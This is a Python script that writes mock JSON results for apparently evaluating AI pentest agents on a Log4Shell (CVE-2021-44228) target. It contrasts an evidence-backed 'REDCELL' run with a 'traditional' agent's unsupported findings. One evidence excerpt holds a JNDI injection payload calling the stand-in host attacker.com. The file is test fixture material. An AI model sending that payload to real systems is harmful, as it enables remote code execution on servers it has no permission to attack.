# -*- coding: utf-8 -*-
"""
模拟 REDCELL 在 Log4Shell 场景下的输出

这是一个预期输出示例，用于验证评估器工作正常
"""

import sys
import io

# 修复 Windows 终端编码
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

MOCK_REDCELL_OUTPUT = {
    "agent": "REDCELL",
    "campaign_id": "log4shell-baseline-001",
    "target": "http://localhost:8080",
    "start_time": "2026-07-28T16:00:00Z",
    "end_time": "2026-07-28T16:02:23Z",
    "duration_seconds": 143,

    "findings": [
        {
            "id": "finding-001",
            "type": "vulnerability",
            "title": "Apache Log4j JNDI Remote Code Execution (CVE-2021-44228)",
            "severity": "critical",
            "cvss": 10.0,

            "evidence": [
                {
                    "tool": "nuclei",
                    "excerpt": "[CVE-2021-44228] [critical] Apache Log4j JNDI RCE http://localhost:8080",
                    "timestamp": "2026-07-28T16:00:45Z"
                },
                {
                    "tool": "curl",
                    "excerpt": "User-Agent: ${jndi:ldap://attacker.com/a}\nHTTP/1.1 200 OK\nServer: log4j-2.14.1",
                    "timestamp": "2026-07-28T16:01:12Z"
                }
            ],

            "reasoning": "检测到服务使用 Log4j 2.14.1，该版本存在 CVE-2021-44228 JNDI 注入漏洞。使用 nuclei 模板验证成功。",
            "confidence": 0.98,
            "verified": True
        }
    ],

    "attack_graph": {
        "nodes": [
            {"id": "host:localhost:8080", "type": "host", "state": "confirmed"},
            {"id": "service:http:8080", "type": "service", "state": "confirmed"},
            {"id": "vuln:CVE-2021-44228", "type": "finding", "state": "confirmed"}
        ],
        "edges": [
            {"src": "host:localhost:8080", "rel": "runs", "dst": "service:http:8080"},
            {"src": "service:http:8080", "rel": "has", "dst": "vuln:CVE-2021-44228"}
        ]
    },

    "evidence_verification": {
        "total_findings": 1,
        "with_evidence": 1,
        "verified": 1,
        "hallucinations": 0
    },

    "metrics": {
        "tools_used": ["nmap", "curl", "nuclei"],
        "requests_sent": 12,
        "hitl_approvals": 0
    }
}


MOCK_TRADITIONAL_AGENT_OUTPUT = {
    "agent": "Traditional-AI-Agent",
    "campaign_id": "log4shell-comparison-001",
    "target": "http://localhost:8080",
    "start_time": "2026-07-28T16:10:00Z",
    "end_time": "2026-07-28T16:12:45Z",
    "duration_seconds": 165,

    "findings": [
        {
            "id": "finding-001",
            "title": "Log4j JNDI Injection Vulnerability",
            "severity": "critical",
            "cvss": 10.0,
            "evidence": []  # 传统方法：无证据，直接信任 LLM
        },
        {
            "id": "finding-002",
            "title": "SQL Injection in Login Page",  # 误报
            "severity": "high",
            "cvss": 8.5,
            "evidence": []
        },
        {
            "id": "finding-003",
            "title": "Cross-Site Scripting (XSS)",  # 误报
            "severity": "medium",
            "cvss": 6.1,
            "evidence": []
        }
    ],

    "evidence_verification": {
        "total_findings": 3,
        "with_evidence": 0,
        "verified": 0,
        "hallucinations": 3  # 所有发现都无证据
    }
}


if __name__ == '__main__':
    import json
    from pathlib import Path

    # 创建 mock 结果目录
    results_dir = Path(__file__).parent.parent / 'results'
    results_dir.mkdir(exist_ok=True)

    # 保存 REDCELL 基线
    with open(results_dir / 'redcell_log4shell_baseline.json', 'w') as f:
        json.dump(MOCK_REDCELL_OUTPUT, f, indent=2)

    # 保存传统方法对比
    with open(results_dir / 'traditional_log4shell_comparison.json', 'w') as f:
        json.dump(MOCK_TRADITIONAL_AGENT_OUTPUT, f, indent=2)

    print("✅ Mock 结果已生成:")
    print(f"  - {results_dir / 'redcell_log4shell_baseline.json'}")
    print(f"  - {results_dir / 'traditional_log4shell_comparison.json'}")
